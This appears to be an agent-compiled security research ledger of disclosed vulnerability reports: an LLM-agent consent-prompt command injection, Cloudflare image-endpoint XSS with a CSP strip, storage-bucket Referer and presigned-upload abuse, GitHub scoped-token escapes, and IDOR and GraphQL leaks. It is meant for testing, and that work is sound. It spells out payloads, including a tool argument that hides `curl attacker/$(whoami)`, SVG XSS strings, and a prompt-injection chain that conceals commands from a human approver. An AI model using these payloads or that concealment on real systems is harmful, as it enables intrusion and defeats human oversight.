ROUTE: `web_extract` on the live HackerOne report page -> HTTP 200, the Summary, Exploit chain, CVSS note, Impact and the CVE cross-reference read in full; the related advisory `github.com/strands-agents/tools/security/advisories/GHSA-mqvc-p852-wf8x` read via search result (the `non_interactive` gate-skip root cause). No fallback route needed.
STATUS: UNVERIFIED (not reproduced — no strands-agents/tools host was stood up this pass; the sinks, the renderer line and the chain are verbatim from the report body).
CLASS: OS command injection in an LLM agent tool framework via an unescaped HTML consent-prompt renderer (CWE-78 / CWE-116 / CWE-451; AWS VDP rated Medium 4 ~ 6.9; reporter `hope_no_dupe`; submitted 2026-10-02, disclosed 2026-11-06; affected strands-agents/tools current HEAD commit 1dd0465, 2026-09-30 — post-0.8.0 and post-0.8.2; the component has since been deprecated/archived; reporter's vector CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H = 8.8, AV:L = 7.8 on local-agent hosts).
CORE METHOD:
  1. THE GATE — strands-agents-tools gates dangerous tool actions behind an interactive human-consent prompt. The prompt is rendered through `prompt_toolkit.HTML()` with NO escaping (`utils/user_input.py:35`), so markup embedded in a tool argument is interpreted, not displayed.
  2. THE ATTACKER-INFLUENCED ARGUMENT — an attacker who can influence a tool argument (via indirect prompt injection in content the agent reads: a web page, a Slack message, a file) can conceal part of the string the operator is asked to approve, while the concealed string is the one that executes.
  3. THE SINKS — in `use_computer`, the `app_name` argument is free-form `Optional[str]` (no enum/allow-list) and flows unsanitized into THREE OS command sinks: (a) Windows `subprocess.run(f"start {actual_app_name}", shell=True, ...)` (line 687); (b) macOS `script = f'tell application "{app_name}" to activate'; subprocess.run(["osascript","-e",script], ...)` (line 747) — AppleScript injection -> `do shell script`; (c) Windows PowerShell `f"...AppActivate('{app_name}')"` piped to `powershell -Command` (line 769) — statement injection.
  4. THE PROMPT — the consent prompt (~line 1003) is built from `locals()` including the raw `app_name`, then rendered via the unescaped HTML renderer.
  5. THE CHAIN — agent ingests untrusted content -> indirect prompt injection drives a `use_computer` call with a crafted `app_name` -> the consent prompt renders it via `HTML()`; the malicious portion is concealed -> the operator sees a benign prompt and approves with `y` -> the sink executes the raw string -> command execution with the agent's privileges.
  6. THE DISTINCT SECOND ROOT CAUSE — CVE-2026-18733 (GHSA-mqvc-p852-wf8x) is the shell tool's `non_interactive` parameter being LLM-controllable in the input schema, so an indirect prompt injection can set it to `true` and skip the consent gate entirely (fixed in 0.8.0; `shell.py`, `python_repl.py`, `load_tool.py` — the only files where `non_interactive` exists). This report is a DIFFERENT root cause: markup parsing of an untrusted argument at the prompt-rendering layer (`user_input.py:35`), affecting tools that gate via `BYPASS_TOOL_CONSENT` + `get_user_input`; `non_interactive` does not appear in `use_computer.py`. The renderer is still unescaped at current HEAD after both the 0.8.0 and 0.8.2 fixes.
  7. THE IMPACT — arbitrary OS command execution on the agent host, running as the agent process's user: full read/write/execute over local secrets, source code, keys, and any network services the host can reach. In a local lab with a mock credential endpoint, a single injected command retrieved credentials and copied `~/.aws/credentials` (mock values; no live AWS account involved).
  8. WHY NOT CRITICAL — the sink is always downstream of the consent gate (no attacker-reachable gate-free path), so `UI:R` is retained and no privilege/authority boundary is crossed; AWS scored it Medium.
DETECTION SIGNAL: an LLM agent / tool framework that (a) renders a human-approval or consent prompt from tool arguments using an HTML-capable renderer (`prompt_toolkit.HTML()`, markdown-to-HTML, `innerHTML`) without escaping, and (b) passes an argument to a shell sink (`subprocess.run(..., shell=True)`, `os.system`, `osascript`, `powershell -Command`, `bash -c`, AppleScript `tell application`). Tells: a free-form `Optional[str]` tool argument with no enum/allow-list; a consent prompt built from `locals()`; a `non_interactive` / `auto_approve` / `skip_consent` parameter in the LLM-controllable input schema; a gate implemented as `BYPASS_TOOL_CONSENT` + `get_user_input`.
CHAIN: an attacker who can get crafted text in front of the agent (a web page, a Slack message, a file — indirect prompt injection) (primitive: the agent ingests untrusted content) -> the injection drives a tool call whose argument carries HTML markup (primitive: the tool argument is attacker-influenced) -> the consent prompt renders the argument with an unescaped HTML renderer, so the malicious portion is concealed from the operator (escalation: the human control is bypassed by UI redressing, not by logic) -> the operator approves what looks benign (escalation: user interaction converts the concealment into approval) -> the raw argument reaches an OS command sink and executes (impact: arbitrary command execution on the agent host with the agent's privileges). Per doctrine §8: preconditions = the agent processes attacker-influenced content AND an operator approves the prompt; gain = command execution on the host. HONESTY: the report demonstrates the concealment + execution in a lab; the "operator approves" step is the intended interaction and is shown in the PoC.
TRANSFERABLE TEST: for EVERY LLM agent / tool framework in scope (coding agents, browser agents, MCP servers, autonomous pipelines) — (1) enumerate the tools that gate on human consent and note which arguments reach a shell (`subprocess.run(shell=True)`, `osascript`, `powershell`, `bash -c`); (2) craft a tool argument containing HTML markup that conceals a shell payload (e.g. an app name like `Calculator<span style="display:none">; curl attacker/$(whoami)</span>`, or an HTML tag that hides the suffix) and drive the agent to call the tool via indirect prompt injection; (3) read the consent prompt as the operator sees it — if the payload is invisible and the prompt looks benign, the renderer is unescaped; (4) approve and observe command execution (use a benign callback like `curl attacker/test` or `time.sleep`); (5) separately inspect the tool's JSON schema for a gate-bypass parameter (`non_interactive`, `auto_approve`, `skip_consent`, `yes`) that the LLM can set — if present, the gate is skippable with no concealment at all. Rule: **a consent prompt that renders tool arguments as HTML without escaping is a UI-redressing primitive — conceal the payload in markup, get the operator to approve a benign-looking prompt, and the concealed string executes; also check whether the gate itself is exposed as an LLM-controllable parameter.**
DEDUPE: 0 hits across all three write targets for `strands`, `prompt_toolkit`, `non_interactive`, `consent prompt`, `use_computer`, `CVE-2026-18733`, `GHSA-mqvc-p852-wf8x`, `4077800`. The `auto_approve` hits are Doorkeeper OAuth consent flags (a different class — an OAuth client trust flag, not an agent tool consent renderer). New general method -> §17.381.

SOURCE: https://www.slcyber.io/research/cache-me-if-you-can-xss-in-cloudflares-cdn-cgi-image (Searchlight Cyber, "Cache Me If You Can: XSS in Cloudflare's /cdn-cgi/image/", 2026-10-28)  2026-11-10
ROUTE: `web_extract` on the live page -> HTTP 200 but a JS shell (navigation only); the full article read IN FULL this pass via `https://r.jina.ai/<url>` (the jina render carried the whole 28,890-char article, head+tail plus the saved full text). No fallback beyond jina was needed.
STATUS: UNVERIFIED (not reproduced — no Cloudflare/Netlify/S3 endpoint was driven this pass; the payloads, the header behaviour and the chain are verbatim from the article).
CLASS: XSS with impact (cache-mediated, same-origin) via an SVG sanitizer serialization differential + a `Cache-Control: no-cache="<field-name>"` trick that strips CSP in Chromium + signed-URL response-header overrides (CWE-79 / CWE-116 / CWE-346).
CORE METHOD:
  1. THE ENDPOINT — Cloudflare's `/cdn-cgi/image/` fetches a source image, sanitizes SVG via `svg-hush` (Rust/`xml-rs`), and serves the transformed body from the customer's own hostname. The response carries `Content-Security-Policy: default-src 'none'; navigate-to 'none'; form-action 'none'; img-src data:; style-src 'unsafe-inline';` — JavaScript is blocked.
  2. THE SANITIZER DIFFERENTIAL — `xml-rs` stores namespace declarations as namespace METADATA, separate from the ordinary attribute list. During serialization, `emit_current_namespace_attributes` writes the namespace URI into `xmlns:prefix="{uri}"` WITHOUT escaping, while ordinary attribute values ARE escaped via `Escaped<AttributeEscapes>`. A namespace URI containing `">` and markup therefore breaks out of the quoted `xmlns` value AFTER the sanitizer validated the document. Payload: `<s:svg xmlns:s="http://www.w3.org/2000/svg" xmlns="&quot;&gt;&lt;a:script xmlns:a=&quot;http://www.w3.org/1999/xhtml&quot;&gt;alert(location.href)&lt;/a:script&gt;&lt;svg">` — the `s:` prefix keeps the root in the legitimate SVG namespace (passes the sanitizer), while the default namespace is serialized unescaped, producing `<svg xmlns=""><a:script xmlns:a="http://www.w3.org/1999/xhtml">alert(location.href)</a:script><svg"/>`.
  3. THE CSP STRIP — `/cdn-cgi/image/` forwards the source response's `Cache-Control` header (and `X-*`). Chromium implements RFC 7234's selective `no-cache="<field-name>"` directive (`HttpResponseHeaders::AddNonCacheableHeaders`): the argument names response headers to EXCLUDE from the cached representation. Setting `Cache-Control: no-cache="Content-Security-Policy"` makes Chromium store the body in its HTTP disk cache WITHOUT the CSP header. The first response still has the CSP (script blocked); the cached copy does not. Firefox and Safari do not implement the selective form.
  4. FORCING THE CACHED COPY — open the target page in a NEW window (so it retains a `window.opener` and is ineligible for BFCache), navigate that window to the attacker's domain, then call `history.back()` — Chromium falls back to the HTTP cache and renders the body with no CSP. (Known CTF technique since 2022 — SECCON 2022 spanote.)
  5. THE SOURCE-RESTRICTION BYPASS — with the default "This zone only" source config, the image fetcher follows HTTP redirects WITHOUT re-checking the source allowlist, so an open redirect on any allowed origin loads an attacker image; with Cloudflare Access enabled on any hostname in the zone, `/cdn-cgi/access/logout?returnTo=<cloudflare.com open redirect>` chains to an arbitrary domain. The chain achieved XSS through `/cdn-cgi/image/` on `https://www.cloudflare.com/`.
  6. THE EXTENSIONS — Netlify Image CDN also forwards/permits the `Cache-Control` value, and the same `no-cache` trick can strip BOTH `Content-Security-Policy` and `Content-Type`, turning an SVG/HTML polyglot (a processing instruction that is inert as SVG but active as HTML: `<?a ><script>alert(location.href)</script> a?>`) into HTML execution. On S3-backed origins, presigned URLs with `response-content-type=text/html` and `response-cache-control=no-cache="Content-Security-Policy"` (signed with your OWN AWS credentials against a publicly readable object) override both headers, extending the technique to custom domains / CNAMEs / reverse proxies that preserve query parameters; GCS V4 signed URLs support the same `response-content-type` override.
DETECTION SIGNAL: an image-optimization/transformation endpoint (`/cdn-cgi/image/`, `/_next/image`, an image CDN) that reflects an attacker-controlled source body and forwards or lets you set response headers (`Cache-Control`, `X-*`, signed-URL `response-*` params); a transformed response carrying `default-src 'none'`; a sanitizer that parses and reserializes XML/SVG (look for a serializer that escapes attributes but not namespace declarations); a Chromium-only `Cache-Control: no-cache="<field-name>"` implementation; a source-fetch that follows redirects without re-validating the allowlist.
CHAIN: an attacker who can control (or inject) an image body the endpoint fetches (primitive: an image source the endpoint will process — an open redirect or an allowed origin) -> the SVG sanitizer's serialization differential lets markup survive as an XSS payload in the transformed body (escalation: a sanitized image becomes an HTML/JS carrier) -> the endpoint forwards the source's `Cache-Control` header (primitive: attacker-controlled response header) -> `Cache-Control: no-cache="Content-Security-Policy"` makes Chromium cache the body without the CSP (escalation: the only remaining defence is removed from the cached copy) -> the attacker forces a `history.back()` from an opener window to load the cached copy (escalation: the CSP-less body is rendered) -> the script executes in the target origin (impact: XSS). Per doctrine §8: preconditions = the victim uses Chromium, visits the attacker's page (which opens the target in a window and drives `history.back()`), and the endpoint reflects attacker content + forwards `Cache-Control`; gain = script execution in the endpoint's origin. HONESTY: the Cloudflare chain is demonstrated by the researchers; the Netlify/S3/GCS extensions are described in the same article with PoCs.
TRANSFERABLE TEST: for EVERY image-optimization/transformation endpoint or image CDN in scope — (1) check whether the transformed response carries a CSP and whether the endpoint forwards/lets you set `Cache-Control` (send a source response with `Cache-Control: no-cache="Content-Security-Policy"` and read the transformed response's headers); (2) build an SVG/HTML polyglot that survives the sanitizer (test namespace-declaration serialization: `xmlns="&quot;&gt;&lt;script&gt;..."`, and a processing-instruction polyglot `<?a ><script>alert(1)</script> a?>`); (3) serve it through the endpoint and open it in Chromium; (4) run the opener+`history.back()` trick (open the target in a window, navigate it to your domain, call `history.back()`) and see whether the script executes without the CSP; (5) for S3/GCS-backed origins, generate a presigned/signed URL with `response-content-type=text/html` (and `response-cache-control=no-cache="Content-Security-Policy"`) against a publicly readable object and test the same. Rule: **a CDN/image endpoint that reflects attacker content and forwards `Cache-Control` can be turned into a CSP-less cached copy — set `Cache-Control: no-cache="Content-Security-Policy"`, force Chromium's HTTP cache with an opener+`history.back()` navigation, and the sanitizer's XSS payload executes.**
DEDUPE: 0 hits across all three write targets for `cdn-cgi`, `no-cache="Content-Security-Policy"`, `response-content-type`, `response-cache-control`, `svg-hush`, `Cache Me If You Can`, `slcyber`. Pre-existing material REVIEWED as related-but-distinct: §17.231 (Scalable Vector Grief) records the SVG-sanitizer parser-differential family (namespace switching, `<animate>` href, XSLT, Safari `<use>` imports) but NOT the `Cache-Control` field-name CSP-strip primitive, the opener+`history.back()` HTTP-cache trick, or the signed-URL response-header overrides. The ledger's generic `Cache-Control: no-cache` hits are cache revalidation/PoC headers, not the `no-cache="<field-name>"` header-exclusion behaviour. New general method -> §17.382.

SOURCE: https://infosecwriteups.com/one-header-away-from-10-gb-of-customer-documents-pii-6k-bounty-0c0ac8c335f2 (InfoSec Writeups, "One Header Away from 10+ GB of Customer Documents (PII) — $6K Bounty", 2026-07-28)  2026-11-10
ROUTE: `web_extract` on the live article -> HTTP 200, the full text read in full (the bypass, the JS-bundle signer snippet, the decoded policy, the multipart overwrite and the ETag proof). No fallback route needed.
STATUS: UNVERIFIED (not reproduced — no Volcengine TOS bucket was touched this pass; the requests, the decoded policy and the impact are verbatim from the article).
CLASS: broken access control / cloud-object-storage misconfiguration — anonymous read bypass via a forgeable `Referer` header (anti-leech used as the only access control) + an unauthenticated presigned-post signer with a client-chosen bucket/key enabling anonymous overwrite (CWE-284 / CWE-348 / CWE-200).
CORE METHOD:
  1. THE SETUP — the target's WeChat customer-service chatbot stored attachments (ID-card photos, hospital certificates, policy screens) in a Volcengine TOS (S3-compatible) bucket. Object reads were protected only by 防盗链 (anti-leech / hotlink protection): the bucket checked the `Referer` header against an allowlist of the app's own domain.
  2. THE READ BYPASS, verbatim — same object, same second, same URL, only the header changes: `GET /chat/message/[REDACTED]/20251211/images/[REDACTED].png` with no Referer -> 403 AccessDenied, 213 bytes; `Referer: https://evil.example.com.cn/` -> 403; `Referer: https://[REDACTED].[Target].com.cn/` -> 200 image/png, 7828 bytes. The attacker simply writes the allowed domain into the header; `Referer` is client-controlled and unsigned.
  3. THE LISTING — bucket listing is governed separately from object reads: an unauthenticated `?max-keys=...` request returning 200 means `ListBucket` was open, so the attacker could enumerate every object key.
  4. THE SIGNER — the app's JS bundle calls its own backend, not a cloud SDK: `fetch("https://[app-host]/volces/api/tos/presigned-post", {method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({bucket:cc, key:h})})` — no `Authorization` header, and both `bucket` and `key` come from the browser.
  5. THE UNAUTHENTICATED REQUEST — `POST /volces/api/tos/presigned-post` with `{"bucket":"[REDACTED]-prod","key":"bugbounty-poc.txt"}` -> 200 with `Access-Control-Allow-Origin: *` and a complete signed upload credential: `policy`, `x-tos-algorithm: TOS4-HMAC-SHA256`, `x-tos-credential: [AK]/20260623/[REGION]/tos/request`, `x-tos-date`, `x-tos-signature`.
  6. THE POLICY — base64-decoding `policy` shows NO size cap, NO content-type restriction, NO ACL, and NO key prefix — just the exact key the caller chose: `{"expiration":"2026-06-23T02:39:54Z","conditions":[{"bucket":"..."},{"key":"bugbounty-poc.txt"},{"x-tos-algorithm":"TOS4-HMAC-SHA256"},{"x-tos-date":"..."},{"x-tos-credential":"..."}]}`.
  7. THE OVERWRITE PROOF — the write is a multipart POST straight to the bucket with the signed fields + file -> 204. Storage returns 204 for both empty and occupied keys, so overwrite is proven by the ETag: same key, different content -> different ETag (`bbea7bc1...` then `736b48e1...`).
  8. THE IMPACT — anonymous enumeration, read, and overwrite of 10+ GB of customer PII in a major insurer's China operation; $6,000 bounty.
DETECTION SIGNAL: an object-storage bucket (S3/TOS/OSS/GCS) fronted by an app where reads are gated by a Referer/anti-leech allowlist (a billing control used as an access control); an unauthenticated `?max-keys=1` ListBucket returning 200; a presigned-URL / presigned-post signer route (`/api/tos/presigned-post`, `/api/s3/sign`, `/presign`, `/upload`) discovered in a JS bundle with no `Authorization` header and a client-supplied bucket/key; a decoded policy with no key prefix, no `content-length-range`, and no content-type condition; `Access-Control-Allow-Origin: *` on the signer.
CHAIN: an unauthenticated attacker on the internet (primitive: no credentials) -> the bucket's object reads are gated only by a forgeable `Referer` header (primitive: a client-controlled header treated as authorization) -> the attacker writes the allowed domain into `Referer` and reads any object (escalation: anonymous read of the full bucket, compounded by an open ListBucket for enumeration) -> the attacker finds the app's unauthenticated presigned-post signer in the JS bundle and asks it to sign an attacker-chosen bucket/key (primitive: no authorization check before the policy is created, and no key prefix / size / content-type constraints) -> the attacker POSTs a multipart upload to the bucket with the signed fields (escalation: anonymous write) -> the attacker overwrites existing customer objects (impact: integrity breach + PII read at scale; $6,000). Per doctrine §8: preconditions = none (unauthenticated); gain = read + overwrite of the production customer-document bucket.
TRANSFERABLE TEST: for EVERY app that stores files in S3/TOS/OSS/GCS — (1) find the bucket URL (JS bundles, network tab, error pages) and test an object read with `Referer:` set to the app's own domain vs an evil domain vs none — a 200 with the allowed Referer and 403 otherwise is the anti-leech bypass; (2) send an unauthenticated `?max-keys=1` (or `?list-type=2&max-keys=1`) to the bucket and check for a 200 listing; (3) grep the JS bundles for the signer route (`presigned-post`, `presign`, `/sign`, `getPresignedUrl`, `tos/presigned`) and call it unauthenticated with an attacker-chosen `bucket` and `key`; (4) base64-decode the returned `policy` and check for a key prefix, `content-length-range`, and content-type conditions — their absence means arbitrary overwrite; (5) POST the multipart upload to the bucket with the signed fields and a test file, then repeat with different content and compare the ETag to prove overwrite-in-place. Rule: **an object bucket whose reads are gated only by a forgeable `Referer` header and whose app exposes an unauthenticated signer that accepts a client-chosen bucket/key is anonymous read + overwrite of every stored file — spoof the `Referer`, then ask the signer for a policy on a victim key and overwrite it.**
DEDUPE: 0 hits across all three write targets for `volcengine`, `anti-leech`, `防盗链`, `presigned-post`, `TOS4-HMAC-SHA256`, `Referer` (as an access control), `One Header Away`. Pre-existing material REVIEWED as related-but-distinct: the ledger's SSRF/presigned-URL entries are about cloud metadata or signed-URL SSRF, not an app-exposed signer; the `Referer` hits are CSRF/referer-check bypass material, not a storage anti-leech control used as the only access control. New general method -> §17.383.

SOURCE: https://github.com/advisories/GHSA-29qm-pmxx-2p86 (CVE-2026-5845) + https://github.com/advisories/GHSA-86rx-87q3-fqhc (CVE-2026-14340)  2026-11-10
ROUTE: `web_extract` on GHSA-29qm-pmxx-2p86 -> HTTP 200, the full advisory text read; CVE-2026-14340 read via the ajaysenr/HackerOne-Disclosed-Reports mirror `reports/3641229.md` (HTTP 200, the program summary verbatim) and the GHSA-86rx-87q3-fqhc search result. No HackerOne report bodies were rendered (`no-content`).
STATUS: UNVERIFIED (not reproduced — no GitHub Enterprise Server instance was tested this pass; the descriptions are verbatim from the two advisories).
CLASS: broken access control / authorization fallback on SCOPED tokens — a token whose scope is bound to an object (a GitHub App installation) escapes that scope because the authorization layer either falls back to a broader context when the scope object is revoked/deleted, or checks a weaker condition (the scope object has SOME permission on the target) instead of the required condition (the token's scope object was EXPLICITLY GRANTED access to the target) (CWE-284 / CWE-639 / CWE-669).
CORE METHOD:
  1. CVE-2026-5845 (High 7.2, CVSS v4.0 AV:L/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:L/SI:L/SA:N) — an improper authorization vulnerability in scoped user-to-server (`ghu_`) token authorization in GitHub Enterprise Server allowed an authenticated attacker to access PRIVATE repositories outside the intended installation scope, including write operations, via an authorization fallback that treated a REVOKED/DELETED installation as a GLOBAL installation context. It could be chained with token revocation timing and SSH push attribution to obtain and reuse a victim-scoped token. Affected all versions prior to 3.21; fixed in 3.20.1, 3.19.5, 3.18.8, 3.17.14, 3.16.17, 3.15.21, 3.14.26.
  2. CVE-2026-14340 (Medium) — a user-to-server token scoped to a GitHub App installation could perform write operations (create issues, issue comments, commit comments, private vulnerability reports) on PUBLIC repositories outside the token's intended scope. The authorization check only verified that the installation had READ permissions on the target repository rather than verifying that the token's installation was EXPLICITLY GRANTED access to that repository. An attacker who obtained a victim's user-to-server token could act as the victim on any public repository with no indication of app involvement. Fixed by adding a repository scope check for user-to-server tokens issued by global apps; affected all versions prior to 3.22, fixed in 3.21.2, 3.20.4, 3.19.8, 3.18.11, 3.17.17, 3.16.20.
  3. THE GENERAL SHAPE — a token's scope is defined by a scope object (installation / organization / tenant / workspace). The authorization code either (a) falls back to a broader context when the scope object is missing, revoked or deleted, or (b) checks a weaker condition (the scope object has SOME capability on the target) instead of the required condition (the token's scope object was EXPLICITLY GRANTED access to the target).
  4. THE TOKEN TAXONOMY — `ghu_` = GitHub App user access token (short-lived, 8 hours, associated with a user account); `ghs_` = installation access token (1 hour); `gho_` = OAuth access token. Revocation: app owners can revoke via `DELETE /installation/token`; org/enterprise owners can uninstall the app, deactivating all installation tokens.
DETECTION SIGNAL: a token type whose scope is bound to an object id (installation, organization, tenant, workspace, project); an authorization code path that resolves the scope object and, on lookup failure / revocation / deletion, falls back to a global or default context; a scope check that tests a CAPABILITY of the scope object on the target rather than an EXPLICIT GRANT to the token; a token that continues to work after the scope object is revoked/deleted; a token that can act on resources the scope object can merely READ.
CHAIN: an authenticated attacker holds (or obtains) a scoped token (primitive: a low-privilege scoped credential) -> the scope object is revoked/deleted, or the target resource is one the scope object has a weaker permission on (primitive: the scope object exists but the grant is not explicit) -> the authorization layer falls back to a broader context or accepts the weaker condition (escalation: the token's effective scope is wider than intended) -> the attacker reads/writes resources outside the intended installation/tenant (impact: cross-installation private repository read/write, or writes appearing as the victim on any public repository; High). Per doctrine §8: preconditions = a scoped token (low privilege) and a revoked/deleted scope object, or a target the scope object can merely read; gain = access to resources outside the token's intended scope.
TRANSFERABLE TEST: for EVERY scoped token / credential in scope (GitHub App `ghu_`/`ghs_`, OAuth tokens scoped to an org/installation/tenant, API keys bound to a workspace/project) — (1) identify the scope object from the token's claims or the API's token-info endpoint; (2) delete/revoke/uninstall the scope object (or ask an admin to) and replay the token against a resource inside and outside the original scope — a 200 outside the original scope is the fallback bug; (3) for each target resource, test whether the check verifies an EXPLICIT grant (the token's scope object was granted access to the target) or merely a CAPABILITY (the scope object can read the target) — the latter is the weaker-condition bug; (4) test write actions (create issue/comment, push, update) with the scoped token on resources the scope object can read but was never granted, and check whether the action succeeds and appears as the victim; (5) chain with token revocation timing: obtain a victim-scoped token, let the scope object be revoked, and check whether the token still resolves to a global context. Rule: **a scoped token whose authorization falls back to a broader context when its scope object is revoked/deleted, or whose scope check verifies a capability rather than an explicit grant, escapes its installation/tenant — revoke the scope object and replay the token, then test write actions on resources the scope object could merely read.**
DEDUPE: 0 hits across all three write targets for `ghu_`, `scoped user-to-server`, `installation scope`, `CVE-2026-5845`, `CVE-2026-14340`, `3638909`, `3641229`, `authorization fallback`. New general method -> §17.384.

SOURCE: https://hackerone.com/reports/797685  2026-11-10
ROUTE: the live `.json` route (`https://hackerone.com/reports/797685.json`) answered HTTP 200 with `visibility: full` and the full reporter body (endpoint, description, resolution and impact all present; the two account ids/emails and the attachment are redacted with `█`). Route that worked: the live HackerOne `.json` endpoint.
STATUS: UNVERIFIED (not reproduced — no Semrush account pair was used this pass; every request line and quote below is verbatim from the report body).
CLASS: IDOR / BOLA (CWE-639) on an OBJECT-ID QUERY PARAMETER — a `GET` status endpoint keyed by `calendar_id` returns the OWNER's user id and the owner's Google-Analytics connection state to any authenticated caller, with no check that the caller owns or was invited to the calendar (HackerOne weakness "Insecure Direct Object Reference (IDOR)", severity medium 5.0 / AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:N/A:N, reporter `a_d_a_m`, submitted 2020-02-16, disclosed 2020-04-02, asset `*.semrush.com` WILDCARD max_severity critical, bounty yes).
CORE METHOD (verbatim from the report body):
  1. THE ENDPOINT, verbatim: `https://ec.semrush.com/api/v1/ga/user_status/?calendar_id=CALENDAR_ID`
  2. THE DESCRIPTION, verbatim: "When a marketing calendar is loaded in the browser, the site sends a request such as this: {F718449}. This request returns information such as if the owner has connected a google analytic account and the owner's user id associated with the calendar with the id pass in parameter. The problem comes from the fact that it is not verified that the user making the request has the calendar or that the person is invited to consult it."
  3. THE RESOLUTION, verbatim: "Check that the user making the request has the calendar or that the person is invited to consult the calendar."
  4. THE IMPACT, verbatim: "A user such as a concurrent service could by bruteforcing the \"calendar_id\" parameter establish a list of all calendars and the number of unique users who have created calendars. It will also know the number of users who have connected their google analytic account on it. This represents bussiness data." / "A user who knows someone's user_id (because he was invited to a calendar owned by the victim for example) can by bruteforcing the parameter \"calendar_id\" establish the number of calendar owned by the victim and the number of calendar being linked to a google analytic account."
  5. THE REPORTER'S OWN TEST SETUP, verbatim: "I used two accounts to search for this vulnerability" (two accounts, ids/emails redacted) — i.e. the test is a two-account differential: account A owns the calendar, account B (not invited) calls the endpoint with A's `calendar_id`.
DETECTION SIGNAL: an endpoint whose name/purpose is a STATUS/LOOKUP (`user_status`, `get_status`, `check`, `exists`, `info`, `detail`) keyed by an object id (`calendar_id`, `order_id`, `report_id`, `invoice_id`, `widget_id`) and whose RESPONSE body contains the OWNER's identity (`user_id`, `owner_id`, `email`, `account_id`) or the owner's integration/entitlement state (GA connected, plan, feature flags); a `GET` with the object id in the QUERY STRING and no ownership check; the two-account differential — the same call with account B's session returns account A's owner id. TELL: the endpoint answers "who owns this object" rather than "what is this object" — the owner's user id is the leaked field.
CHAIN: an authenticated caller (any low-privilege account) enumerates `calendar_id` (primitive: an object id in a query parameter, often a long/random token but still enumerable) -> the `user_status` endpoint returns the calendar OWNER's user id and GA-connection state with no ownership/invite check (escalation: cross-user identity + account state disclosure — the owner's user id is exactly the key needed for every other IDOR/BOLA test on the platform) -> the attacker builds a map of object id -> owner user id -> integration state (escalation: a competitor gets a business-intel list of all calendars, unique users and GA adoption) -> with a known victim user_id, brute-force `calendar_id` to count that victim's calendars and GA links (escalation: per-victim account mapping). Per doctrine §8: preconditions = any authenticated account (PR:L per the CVSS vector) and a valid `calendar_id` (obtainable from your own calendar, then enumerated); gain = the owner's user id + GA-connection state for every calendar, and per-victim calendar counts. HONESTY: the report demonstrates the IDOR and the enumeration; the "business data" impact is the reporter's framing — the leaked fields are an internal user id and a boolean, so this is a P3-class limited cross-user data read, not a P1/P2.
TRANSFERABLE TEST: on ANY target with an object-id status/lookup endpoint — (1) create your own object (calendar, order, report, invoice, widget) and capture the `GET` that loads its status; note the object id parameter and whether the response contains the OWNER's user id / email / account state; (2) with a SECOND account (not the owner, not invited), replay the same `GET` with the first account's object id — a 200 whose body contains the first account's owner id is the IDOR; (3) enumerate the id space (sequential ids: +1/-1; random ids: harvest your own ids and look for length/format, then brute-force within the rate limit) and record how many distinct owner ids you can map; (4) then CHAIN, never stop here: the leaked owner user id is the key for every other object endpoint — replay the platform's other `GET`s with the victim's user id and the enumerated object ids (profile, billing, integrations, exports) and test whether the same missing ownership check exists there; (5) if the endpoint is unauthenticated, repeat with no session. Rule: **a status/lookup endpoint keyed by an object id that returns the OWNER's user id (or the owner's integration/entitlement state) without checking that the caller owns or was invited to the object is an IDOR — create your object, read the owner id it returns, then replay the call with a second account and the first account's object id.**
DEDUPE: 0 hits across all three write targets for `797685`, `a_d_a_m`, `semrush`, `calendar_id`, `user_status`, `ga/user_status`, `marketing calendar`. The `semrush` hits are the recorded OAuth success-page postMessage entry (#314814 -> §17.361), a different bug class and endpoint. Pre-existing IDOR material REVIEWED as related-but-distinct: the ride-hailing driver `getTenderStatus` entry (#1785079 — a status endpoint returning counterparty PII, but the id is one the driver's OWN response already hands back, and the leaked fields are phone/GPS, not the owner's user id) and the FetLife `Accept`-header ACL bypass (a representation-layer bypass, not an object-id ownership check). NONE records an object-id STATUS endpoint whose response embeds the OWNER's user id + integration state with no ownership/invite check. New general method -> §17.385.

SOURCE: https://hackerone.com/reports/614355  2026-11-10
ROUTE: the live `.json` route (`https://hackerone.com/reports/614355.json`) answered HTTP 200 with `visibility: full` and the full reporter body (4,003 B; both `curl` commands, both responses and the impact are present). Route that worked: the live HackerOne `.json` endpoint.
STATUS: UNVERIFIED (not reproduced — no GitLab account was used this pass; every command, payload and response below is verbatim from the report body).
CLASS: authorization bypass / improper access control in a GRAPHQL field — the `namespace(fullPath:)` query returns the description, visibility, id and project list of a PRIVATE group/subgroup and of a PRIVATE user profile to an UNAUTHENTICATED caller, while the REST API and the GUI both hide the same data (CWE-863 / CWE-200; HackerOne weakness "Improper Access Control - Generic", severity medium 5.3 / AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N, reporter `rpadovani`, submitted 2019-06-14, disclosed 2019-12-03, asset gitlab.com max_severity critical, bounty yes).
CORE METHOD (verbatim from the report body):
  1. THE SUMMARY, verbatim: "Using the \"namespace\" query on Graphql you can retrieve some private data that is not available through Standard API or through Web API"
  2. THE REST/GUI BASELINE (the data IS hidden elsewhere), verbatim: "My Gitlab profile is private: https://gitlab.com/rpadovani" / "You cannot access a list of my projects: https://gitlab.com/users/rpadovani/contributed" / "You cannot access these data through the standard APIs:" `curl --header "PRIVATE-TOKEN: anotherUserToken" 'https://gitlab.com/api/v4/namespaces/16048'` -> `{"message":"404 Namespace Not Found"}` (rpadovani user id is 16048, token of another user).
  3. THE GRAPHQL BYPASS (NO TOKEN AT ALL), verbatim: `curl 'https://gitlab.com/api/graphql' -H 'Content-Type: application/json' --data '{"query":"{namespace(fullPath:\"rpadovani\") {description requestAccessEnabled fullName fullPath id lfsEnabled name path visibility projects (includeSubgroups: true, ) {edges {node {id name archived visibility description}}}}}","variables":null,"operationName":null}'` -> `{"data":{"namespace":{"description":"","requestAccessEnabled":true,"fullName":"rpadovani","fullPath":"rpadovani","id":"gid://gitlab/Namespace/18021","lfsEnabled":true,"name":"rpadovani","path":"rpadovani","visibility":"public","projects":{"edges":[{"node":{"id":"gid://gitlab/Project/11265641","name":"737-max-8","archived":false,"visibility":"public","description":"https://737max8.com"}}, ...OMIT...` — i.e. the private profile's full project list is returned with no token.
